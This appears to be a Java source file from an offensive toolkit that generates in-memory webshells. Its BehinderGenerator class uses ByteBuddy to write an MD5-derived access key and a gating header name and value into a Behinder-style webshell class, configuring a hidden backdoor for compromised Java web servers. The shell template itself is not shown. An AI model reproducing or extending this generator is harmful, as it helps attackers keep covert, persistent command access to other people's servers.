package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.config.BehinderConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.DigestUtils;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    public DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
        return builder.field(named("pass")).value(md5Key)
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}
